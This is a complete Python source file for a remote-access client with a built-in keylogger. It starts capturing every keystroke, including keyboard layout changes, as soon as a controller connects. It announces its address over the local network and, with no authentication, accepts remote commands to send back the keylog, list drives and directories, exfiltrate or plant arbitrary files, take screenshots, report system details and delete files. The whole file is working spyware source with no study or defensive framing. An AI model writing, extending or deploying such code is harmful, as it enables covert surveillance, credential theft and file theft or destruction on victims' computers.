import asyncio
import socket
import threading
import time
import os
import sys
import string
import psutil
import platform
import urllib.parse
from pynput import keyboard
from PIL import ImageGrab
import io
import zlib

LOG_FILE = "keylog.txt"
CLIENT_LOG_FILE = "client_log.txt"

IS_WINDOWS = sys.platform.startswith('win')
if IS_WINDOWS:
    import ctypes
    import win32api
    import win32con

    user32 = ctypes.WinDLL('user32', use_last_error=True)

    def get_foreground_window_thread_id():
        hwnd = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, 0)
        return thread_id

    def get_keyboard_layout():
        thread_id = get_foreground_window_thread_id()
        klid = user32.GetKeyboardLayout(thread_id)
        lid = klid & 0xFFFF
        return lid

    LANG_MAP = {
        0x041E: 'Thai',
        0x0409: 'EN',
        0x0453: 'Khmer',
        0x0408: 'Greek',
    }
    def get_layout_name():
        lid = get_keyboard_layout()
        return LANG_MAP.get(lid, hex(lid))

    def to_unicode_ex(vk, scan, state, layout):
        buf = ctypes.create_unicode_buffer(8)
        rc = user32.ToUnicodeEx(
            vk, scan,
            ctypes.byref(state),
            buf, len(buf),
            0,
            layout
        )
        if rc > 0:
            return buf.value
        else:
            return ''

    def get_char_from_key_event_win(key):
        try:
            if hasattr(key, 'vk'):
                vk = key.vk
            elif hasattr(key, 'value') and hasattr(key.value, 'vk'):
                vk = key.value.vk
            elif hasattr(key, 'char') and key.char:
                vk = win32api.VkKeyScan(key.char) & 0xff
            else:
                return None

            scan = user32.MapVirtualKeyW(vk, 0)
            state = (ctypes.c_byte * 256)()
            for k in [win32con.VK_SHIFT, win32con.VK_CONTROL, win32con.VK_MENU, win32con.VK_CAPITAL]:
                if win32api.GetKeyState(k) & 0x8000:
                    state[k] |= 0x80
            layout = user32.GetKeyboardLayout(get_foreground_window_thread_id())
            char = to_unicode_ex(vk, scan, state, layout)
            return char
        except Exception:
            return None
else:
    import locale
    def get_layout_name():
        try:
            lang = locale.getdefaultlocale()[0]
            return lang if lang else 'Unknown'
        except:
            return 'Unknown'

class CrossPlatformKeylogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.keylog_lock = threading.Lock()
        self.last_layout = None
        self.line_buffer = ""

    def flush_buffer(self):
        if self.line_buffer:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(self.line_buffer + "\n")
            self.line_buffer = ""

    def log_key(self, key):
        try:
            with self.keylog_lock:
                current_layout = get_layout_name()
                if self.last_layout != current_layout:
                    self.flush_buffer()
                    with open(self.log_file, "a", encoding="utf-8") as f:
                        f.write(f"[LAYOUT: {current_layout}]\n")
                    self.last_layout = current_layout

                char = ''
                if IS_WINDOWS:
                    char = get_char_from_key_event_win(key)
                else:
                    if hasattr(key, 'char') and key.char is not None:
                        char = key.char

                if char and (len(char) == 1 and ord(char) < 32 and char not in ('\n', '\t')):
                    char = ''

                if not char or char == '':
                    if key == keyboard.Key.space:
                        char = ' '
                    elif key == keyboard.Key.enter:
                        self.flush_buffer()
                        return
                    elif key == keyboard.Key.tab:
                        char = '\t'
                    elif key == keyboard.Key.backspace:
                        self.line_buffer = self.line_buffer[:-1]
                        return
                    else:
                        return True

                self.line_buffer += char
        except Exception:
            pass
        return True

def get_lan_ip(subnet_prefixes=['10.', '192.168.', '172.']):
    addrs = psutil.net_if_addrs()
    stats = psutil.net_if_stats()
    for iface, addr_list in addrs.items():
        if stats[iface].isup:
            for addr in addr_list:
                if addr.family == socket.AF_INET:
                    ip = addr.address
                    if not ip.startswith("127.") and not ip.startswith("169.254."):
                        for prefix in subnet_prefixes:
                            if ip.startswith(prefix):
                                return ip
    for iface, addr_list in addrs.items():
        if stats[iface].isup:
            for addr in addr_list:
                if addr.family == socket.AF_INET:
                    ip = addr.address
                    if not ip.startswith("127.") and not ip.startswith("169.254."):
                        return ip
    return None

def get_system_info():
    try:
        info = []
        info.append(f"Operating System: {platform.system()} {platform.release()} ({platform.version()})")
        info.append(f"Architecture: {platform.machine()}")
        info.append(f"Processor: {platform.processor()}")
        cpu_count = psutil.cpu_count(logical=True)
        cpu_physical = psutil.cpu_count(logical=False)
        info.append(f"CPU Cores: {cpu_physical} physical, {cpu_count} logical")
        mem = psutil.virtual_memory()
        info.append(f"Total RAM: {mem.total / (1024**3):.2f} GB")
        info.append(f"Available RAM: {mem.available / (1024**3):.2f} GB")
        disk = psutil.disk_usage('/')
        info.append(f"Total Disk: {disk.total / (1024**3):.2f} GB")
        info.append(f"Used Disk: {disk.used / (1024**3):.2f} GB")
        info.append(f"Free Disk: {disk.free / (1024**3):.2f} GB")
        return "\n".join(info)
    except Exception as e:
        return f"[ERROR] Failed to gather system info: {e}"

class ClientListener:
    def __init__(self, listen_port=12345, udp_broadcast_port=12346):
        self.listen_port = listen_port
        self.udp_broadcast_port = udp_broadcast_port
        self.running = False
        self.keylog_started = False
        self.keylogger = CrossPlatformKeylogger(LOG_FILE)
        self.server = None
        self.server_task = None

    def log_message(self, message):
        with open(CLIENT_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")

    def broadcast_ip(self, interval=5):
        my_ip = get_lan_ip()
        if not my_ip:
            print("ไม่พบ LAN IP ที่ใช้งานได้! (ตรวจสอบ network ของเครื่องนี้)")
            self.log_message("ไม่พบ LAN IP ที่ใช้งานได้!")
            return
        print(f"Broadcasting from {my_ip}")
        self.log_message(f"Broadcasting from {my_ip}")
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        udp_socket.bind((my_ip, 0))
        try:
            while self.running:
                try:
                    udp_socket.sendto(b"CLIENT_ALIVE", ("255.255.255.255", self.udp_broadcast_port))
                    time.sleep(interval)
                except Exception as e:
                    print(f"[DEBUG] Error broadcasting IP: {e}")
                    self.log_message(f"[DEBUG] Error broadcasting IP: {e}")
                    time.sleep(interval)
        finally:
            udp_socket.close()

    def start_keylogger_once(self):
        if not self.keylog_started:
            self.keylog_started = True
            listener = keyboard.Listener(on_press=self.keylogger.log_key)
            listener.daemon = True
            listener.start()
            self.log_message("[INFO] Keylogger started")

    async def handle_connection(self, reader, writer):
        self.start_keylogger_once()
        try:
            data = await reader.read(1024)
            if not data:
                self.log_message("[DEBUG] No data received from client")
                return
            cmd = data.decode("utf-8", errors="ignore").strip()
            print(f"[DEBUG] Received command: {cmd}")
            self.log_message(f"[DEBUG] Received command: {cmd}")
            if cmd == "GET_LOG":
                self.keylogger.flush_buffer()
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, "r", encoding="utf-8") as f:
                        content = f.read()
                    if len(content) > 10000:
                        content = content[-10000:]
                    if not content:
                        writer.write(b"[ERROR] Keylog file is empty")
                        print(f"[DEBUG] Keylog file is empty")
                        self.log_message("[DEBUG] Keylog file is empty")
                    else:
                        writer.write(content.encode("utf-8", errors="ignore"))
                        print(f"[DEBUG] Sent keylog content: {len(content)} bytes")
                        self.log_message(f"[DEBUG] Sent keylog content: {len(content)} bytes")
                else:
                    writer.write(b"[ERROR] Keylog file not found")
                    print(f"[DEBUG] Keylog file not found")
                    self.log_message("[DEBUG] Keylog file not found")
                await writer.drain()
            elif cmd == "LIST_DRIVE":
                drives = []
                for letter in string.ascii_uppercase:
                    if os.path.exists(f"{letter}:\\"):
                        drives.append(f"{letter}:\\")
                resp = "\n".join(drives)
                try:
                    writer.write(resp.encode("utf-8", errors="ignore"))
                    await writer.drain()
                    print(f"[DEBUG] Sent drive list: {resp}")
                    self.log_message(f"[DEBUG] Sent drive list: {resp}")
                except Exception as e:
                    print(f"[DEBUG] Error sending drive list: {e}")
                    self.log_message(f"[DEBUG] Error sending drive list: {e}")
            elif cmd.startswith("LIST_DIR:"):
                path = cmd[9:].strip()
                path = urllib.parse.unquote(path)
                if not path:
                    path = os.getcwd()
                try:
                    entries = []
                    for fname in os.listdir(path):
                        fpath = os.path.join(path, fname)
                        if os.path.isdir(fpath):
                            entries.append(f"[DIR] {fname}")
                        else:
                            entries.append(fname)
                    resp = "\n".join(entries)
                    writer.write(resp.encode("utf-8", errors="ignore"))
                    await writer.drain()
                    print(f"[DEBUG] Sent directory list for {path}: {len(entries)} entries")
                    self.log_message(f"[DEBUG] Sent directory list for {path}: {len(entries)} entries")
                except Exception as e:
                    resp = f"[ERROR] {e}"
                    writer.write(resp.encode("utf-8", errors="ignore"))
                    await writer.drain()
                    print(f"[DEBUG] Error sending directory list for {path}: {e}")
                    self.log_message(f"[DEBUG] Error sending directory list for {path}: {e}")
            elif cmd.startswith("DOWNLOAD:"):
                filepath = cmd[len("DOWNLOAD:"):].strip()
                filepath = urllib.parse.unquote(filepath)
                try:
                    if not os.path.isfile(filepath):
                        writer.write(b"[ERROR] File not found or is not a file.")
                        await writer.drain()
                        print(f"[DEBUG] File not found: {filepath}")
                        self.log_message(f"[DEBUG] File not found: {filepath}")
                    else:
                        with open(filepath, "rb") as f:
                            data = f.read()
                        compressed_data = zlib.compress(data)
                        filesize = len(compressed_data)
                        writer.write(f"[FILE_SIZE]{filesize}".encode("utf-8"))
                        await writer.drain()
                        print(f"[DEBUG] Sent file size: {filesize} for {filepath} (compressed)")
                        self.log_message(f"[DEBUG] Sent file size: {filesize} for {filepath} (compressed)")
                        ack = await reader.read(16)
                        print(f"[DEBUG] Received ack: {ack}")
                        self.log_message(f"[DEBUG] Received ack: {ack}")
                        if ack != b"ready":
                            return
                        sent = 0
                        start_time = time.time()
                        while sent < filesize:
                            chunk = compressed_data[sent:sent + 8192]
                            if not chunk:
                                break
                            writer.write(chunk)
                            await writer.drain()
                            sent += len(chunk)
                            latency = (time.time() - start_time) * 1000
                            print(f"[DEBUG] Sent {sent}/{filesize} bytes for {filepath}, latency: {latency:.2f} ms")
                            self.log_message(f"[DEBUG] Sent {sent}/{filesize} bytes for {filepath}, latency: {latency:.2f} ms")
                            start_time = time.time()
                        print(f"[DEBUG] File transfer completed: {sent} bytes")
                        self.log_message(f"[DEBUG] File transfer completed: {sent} bytes")
                except Exception as e:
                    print(f"[DEBUG] Error in file transfer: {e}")
                    self.log_message(f"[DEBUG] Error in file transfer: {e}")
                    try:
                        writer.write(f"[ERROR] {e}".encode("utf-8"))
                        await writer.drain()
                    except:
                        pass
            elif cmd.startswith("UPLOAD:"):
                try:
                    parts = cmd[len("UPLOAD:"):].rsplit(":", 1)
                    if len(parts) != 2:
                        writer.write(b"[ERROR] Invalid upload command")
                        await writer.drain()
                        print(f"[DEBUG] Invalid upload command: {cmd}")
                        self.log_message(f"[DEBUG] Invalid upload command: {cmd}")
                        return
                    filepath, filesize = parts
                    filepath = urllib.parse.unquote(filepath)
                    try:
                        filesize = int(filesize)
                    except ValueError:
                        writer.write(b"[ERROR] Invalid file size")
                        await writer.drain()
                        print(f"[DEBUG] Invalid file size in command: {cmd}")
                        self.log_message(f"[DEBUG] Invalid file size in command: {cmd}")
                        return
                    if os.path.exists(filepath):
                        writer.write(b"[ERROR] File already exists")
                        await writer.drain()
                        print(f"[DEBUG] File already exists: {filepath}")
                        self.log_message(f"[DEBUG] File already exists: {filepath}")
                        return
                    disk_usage = psutil.disk_usage(os.path.dirname(filepath) or ".")
                    if disk_usage.free < filesize:
                        writer.write(b"[ERROR] Insufficient disk space")
                        await writer.drain()
                        print(f"[DEBUG] Insufficient disk space for {filepath}: {filesize} bytes needed, {disk_usage.free} bytes available")
                        self.log_message(f"[DEBUG] Insufficient disk space for {filepath}: {filesize} bytes needed, {disk_usage.free} bytes available")
                        return
                    os.makedirs(os.path.dirname(filepath) or ".", exist_ok=True)
                    writer.write(b"ready")
                    await writer.drain()
                    print(f"[DEBUG] Ready to receive file: {filepath} ({filesize} bytes)")
                    self.log_message(f"[DEBUG] Ready to receive file: {filepath} ({filesize} bytes)")
                    received = 0
                    chunks = []
                    start_time = time.time()
                    while received < filesize:
                        chunk = await reader.read(min(8192, filesize - received))
                        if not chunk:
                            writer.write(b"[ERROR] Connection closed")
                            await writer.drain()
                            print(f"[DEBUG] Connection closed while receiving {filepath}")
                            self.log_message(f"[DEBUG] Connection closed while receiving {filepath}")
                            return
                        chunks.append(chunk)
                        received += len(chunk)
                        latency = (time.time() - start_time) * 1000
                        print(f"[DEBUG] Received {received}/{filesize} bytes for {filepath}, latency: {latency:.2f} ms")
                        self.log_message(f"[DEBUG] Received {received}/{filesize} bytes for {filepath}, latency: {latency:.2f} ms")
                        start_time = time.time()
                    compressed_data = b"".join(chunks)
                    try:
                        data = zlib.decompress(compressed_data)
                        with open(filepath, "wb") as f:
                            f.write(data)
                        writer.write(b"success")
                        await writer.drain()
                        print(f"[INFO] Successfully received and decompressed {filepath} ({filesize} bytes)")
                        self.log_message(f"[INFO] Successfully received and decompressed {filepath} ({filesize} bytes)")
                    except Exception as e:
                        writer.write(f"[ERROR] Decompression failed: {e}".encode("utf-8"))
                        await writer.drain()
                        print(f"[DEBUG] Decompression failed for {filepath}: {e}")
                        self.log_message(f"[DEBUG] Decompression failed for {filepath}: {e}")
                except Exception as e:
                    print(f"[DEBUG] Upload failed for {filepath}: {e}")
                    self.log_message(f"[DEBUG] Upload failed for {filepath}: {e}")
                    try:
                        writer.write(f"[ERROR] {e}".encode("utf-8"))
                        await writer.drain()
                    except:
                        pass
            elif cmd == "SCREENSHOT":
                try:
                    screenshot = ImageGrab.grab()
                    buffer = io.BytesIO()
                    screenshot.save(buffer, format="PNG")
                    image_data = buffer.getvalue()
                    compressed_data = zlib.compress(image_data)
                    filesize = len(compressed_data)
                    writer.write(f"[FILE_SIZE]{filesize}".encode("utf-8"))
                    await writer.drain()
                    print(f"[DEBUG] Sent screenshot size: {filesize} bytes (compressed)")
                    self.log_message(f"[DEBUG] Sent screenshot size: {filesize} bytes (compressed)")
                    ack = await reader.read(16)
                    print(f"[DEBUG] Received ack: {ack}")
                    self.log_message(f"[DEBUG] Received ack: {ack}")
                    if ack != b"ready":
                        writer.write(b"[ERROR] Client did not send ready signal")
                        await writer.drain()
                        print(f"[DEBUG] Client did not send ready signal")
                        self.log_message(f"[DEBUG] Client did not send ready signal")
                        return
                    sent = 0
                    start_time = time.time()
                    while sent < filesize:
                        chunk = compressed_data[sent:sent + 8192]
                        writer.write(chunk)
                        await writer.drain()
                        sent += len(chunk)
                        latency = (time.time() - start_time) * 1000
                        print(f"[DEBUG] Sent {sent}/{filesize} bytes for screenshot, latency: {latency:.2f} ms")
                        self.log_message(f"[DEBUG] Sent {sent}/{filesize} bytes for screenshot, latency: {latency:.2f} ms")
                        start_time = time.time()
                    print(f"[INFO] Screenshot transfer completed: {sent} bytes")
                    self.log_message(f"[INFO] Screenshot transfer completed: {sent} bytes")
                except Exception as e:
                    print(f"[DEBUG] Error capturing screenshot: {e}")
                    self.log_message(f"[DEBUG] Error capturing screenshot: {e}")
                    try:
                        writer.write(f"[ERROR] {e}".encode("utf-8"))
                        await writer.drain()
                    except Exception as e2:
                        print(f"[DEBUG] Error sending error message: {e2}")
                        self.log_message(f"[DEBUG] Error sending error message: {e2}")
            elif cmd == "SYSTEM_INFO":
                try:
                    sys_info = get_system_info()
                    writer.write(sys_info.encode("utf-8", errors="ignore"))
                    await writer.drain()
                    print(f"[DEBUG] Sent system info: {len(sys_info)} bytes")
                    self.log_message(f"[DEBUG] Sent system info: {len(sys_info)} bytes")
                except Exception as e:
                    writer.write(f"[ERROR] {e}".encode("utf-8"))
                    await writer.drain()
                    print(f"[DEBUG] Error sending system info: {e}")
                    self.log_message(f"[DEBUG] Error sending system info: {e}")
            elif cmd.startswith("DELETE:"):
                filepath = cmd[len("DELETE:"):].strip()
                filepath = urllib.parse.unquote(filepath)
                try:
                    if not os.path.isfile(filepath):
                        writer.write(b"[ERROR] File not found or is not a file")
                        await writer.drain()
                        print(f"[DEBUG] File not found for deletion: {filepath}")
                        self.log_message(f"[DEBUG] File not found for deletion: {filepath}")
                    else:
                        os.remove(filepath)
                        writer.write(b"success")
                        await writer.drain()
                        print(f"[INFO] File deleted: {filepath}")
                        self.log_message(f"[INFO] File deleted: {filepath}")
                except Exception as e:
                    writer.write(f"[ERROR] {e}".encode("utf-8"))
                    await writer.drain()
                    print(f"[DEBUG] Error deleting file: {filepath}: {e}")
                    self.log_message(f"[DEBUG] Error deleting file: {filepath}: {e}")
            else:
                writer.write(b"[ERROR] Unknown command")
                await writer.drain()
                print(f"[DEBUG] Unknown command: {cmd}")
                self.log_message(f"[DEBUG] Unknown command: {cmd}")
        except Exception as e:
            print(f"[DEBUG] Error in handle_connection: {e}")
            self.log_message(f"[DEBUG] Error in handle_connection: {e}")
            try:
                writer.write(f"[ERROR] {e}".encode("utf-8"))
                await writer.drain()
            except:
                pass
        finally:
            try:
                if not writer.is_closing():
                    writer.close()
                    await writer.wait_closed()
            except Exception as e:
                print(f"[DEBUG] Error closing writer: {e}")
                self.log_message(f"[DEBUG] Error closing writer: {e}")

    async def listen_for_server(self):
        my_ip = get_lan_ip()
        if not my_ip:
            my_ip = "0.0.0.0"
            print("ไม่พบ LAN IP, ใช้ 0.0.0.0 แทน")
            self.log_message("ไม่พบ LAN IP, ใช้ 0.0.0.0 แทน")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((my_ip, self.listen_port))  # Bind socket กับ IP และ port
            sock.listen()
            self.server = await asyncio.start_server(self.handle_connection, sock=sock)  # ใช้เฉพาะ sock
            print(f"Waiting for server(s) to connect at {my_ip}:{self.listen_port}")
            self.log_message(f"Waiting for server(s) to connect at {my_ip}:{self.listen_port}")
            self.server_task = asyncio.create_task(self.server.serve_forever())
            await self.server_task
        except OSError as e:
            print(f"[ERROR] Failed to bind to {my_ip}:{self.listen_port}: {e}")
            self.log_message(f"[ERROR] Failed to bind to {my_ip}:{self.listen_port}: {e}")
            if e.errno == 10048:
                print("Port is already in use. Try a different port or close the program using it.")
                print("To find and close the program using port 12345, run:")
                print("  On Windows: netstat -a -n -o | find \"12345\"")
                print("  Then: taskkill /PID <PID> /F")
            raise
        except asyncio.CancelledError:
            print("[INFO] Server task cancelled")
            self.log_message("[INFO] Server task cancelled")
            self.server.close()
            await self.server.wait_closed()
            print("[INFO] Server closed")
            self.log_message("[INFO] Server closed")

    async def run_async(self):
        self.running = True
        threading.Thread(target=self.broadcast_ip, daemon=True).start()
        await self.listen_for_server()

    def run(self):
        try:
            asyncio.run(self.run_async())
        except OSError as e:
            if e.errno == 10048:
                print(f"[ERROR] Port {self.listen_port} is already in use. Try a different port or close the program using it.")
                self.log_message(f"[ERROR] Port {self.listen_port} is already in use. Try a different port or close the program using it.")
                print("To find and close the program using port 12345, run:")
                print("  On Windows: netstat -a -n -o | find \"12345\"")
                print("  Then: taskkill /PID <PID> /F")
            else:
                print(f"[ERROR] Failed to start client: {e}")
                self.log_message(f"[ERROR] Failed to start client: {e}")
        except KeyboardInterrupt:
            self.running = False
            print("[INFO] Shutting down client due to KeyboardInterrupt")
            self.log_message("[INFO] Shutting down client due to KeyboardInterrupt")

if __name__ == "__main__":
    client = ClientListener()
    client.run()